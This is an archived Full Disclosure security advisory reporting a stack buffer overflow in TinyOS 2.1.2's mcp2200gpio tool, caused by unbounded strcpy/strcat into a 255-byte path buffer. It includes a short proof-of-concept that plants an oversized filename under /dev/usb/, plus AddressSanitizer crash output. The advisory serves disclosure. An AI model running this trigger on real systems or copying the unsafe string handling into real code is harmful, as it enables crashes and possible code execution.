---
title: TinyOS 2.1.2 Stack-Based Buffer Overflow in mcp2200gpio
url: https://seclists.org/fulldisclosure/2026/Jan/14
source: Full Disclosure
date: 2026-01-11
fetch_date: 2026-01-12T03:37:54.762629
---

# TinyOS 2.1.2 Stack-Based Buffer Overflow in mcp2200gpio

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](13)
[By Date](date.html#14)
[![Next](/images/right-icon-16x16.png)](15)

[![Previous](/images/left-icon-16x16.png)](13)
[By Thread](index.html#14)
[![Next](/images/right-icon-16x16.png)](15)

![](/shared/images/nst-icons.svg#search)

# TinyOS 2.1.2 Stack-Based Buffer Overflow in mcp2200gpio

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Thu, 8 Jan 2026 10:28:22 -0500

---

```
A stack-based buffer overflow vulnerability exists in the mcp2200gpio
utility due to unsafe use of strcpy() and strcat() when constructing device
paths during automatic device discovery. A local attacker can trigger the
vulnerability by creating a specially crafted filename under /dev/usb/,
resulting in stack memory corruption and a process crash. In non-hardened
builds, this may lead to arbitrary code execution.

*Root Cause:*

The vulnerability occurs when the program scans /dev/usb/ for HID devices
and constructs a device path using unbounded string operations:

char temppath[255];
strcpy(temppath, "/dev/usb/");
strcat(temppath, dir->d_name);

The filename dir->d_name is attacker-controlled via the filesystem and may
reach up to NAME_MAX bytes. When concatenated with the static prefix
/dev/usb/, the resulting string can exceed the bounds of the fixed-size
temppath stack buffer, leading to a stack-based buffer overflow.

*Impact:*

   - Stack memory corruption
   - Denial of Service (application crash)
   - Arbitrary code execution in non-hardened builds

The overflow overwrites adjacent stack variables, including structures used
later in HID ioctl operations.

*Proof of Concept:*sudo mkdir -p /dev/usb
sudo touch /dev/usb/hiddev$(python3 - << 'EOF'
print("A" * 246)
EOF
)

# sudo ./mcp2200gpio -n 1 -m on -v 0x0000

*Output:*=================================================================
==492273==ERROR: AddressSanitizer: stack-buffer-overflow on address
0xfbffa9c0040f at pc 0xaaaab0710424 bp 0xffffc5ef3180 sp 0xffffc5ef2970
WRITE of size 253 at 0xfbffa9c0040f thread T0
    #0 0xaaaab0710420 in strcat
(/root/tinyos-main/tools/platforms/ucmote/mcp2200gpio/mcp2200gpio+0xc0420)
(BuildId: 06bb85b2acdecb46e7913ae301c4f4124be84374)
    #1 0xaaaab076e6cc in main
/root/tinyos-main/tools/platforms/ucmote/mcp2200gpio/mcp2200gpio.c:137:6
    #2 0xffffab942598 in __libc_start_call_main
csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #3 0xffffab942678 in __libc_start_main csu/../csu/libc-start.c:360:3
    #4 0xaaaab0686e6c in _start
(/root/tinyos-main/tools/platforms/ucmote/mcp2200gpio/mcp2200gpio+0x36e6c)
(BuildId: 06bb85b2acdecb46e7913ae301c4f4124be84374)

Address 0xfbffa9c0040f is located in stack of thread T0 at offset 1039 in
frame
    #0 0xaaaab076d8bc in main
/root/tinyos-main/tools/platforms/ucmote/mcp2200gpio/mcp2200gpio.c:43

SUMMARY: AddressSanitizer: stack-buffer-overflow
(/root/tinyos-main/tools/platforms/ucmote/mcp2200gpio/mcp2200gpio+0xc0420)
(BuildId: 06bb85b2acdecb46e7913ae301c4f4124be84374) in strcat
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](13)
[By Date](date.html#14)
[![Next](/images/right-icon-16x16.png)](15)

[![Previous](/images/left-icon-16x16.png)](13)
[By Thread](index.html#14)
[![Next](/images/right-icon-16x16.png)](15)

### Current thread:

* **TinyOS 2.1.2 Stack-Based Buffer Overflow in mcp2200gpio** *Ron E (Jan 10)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")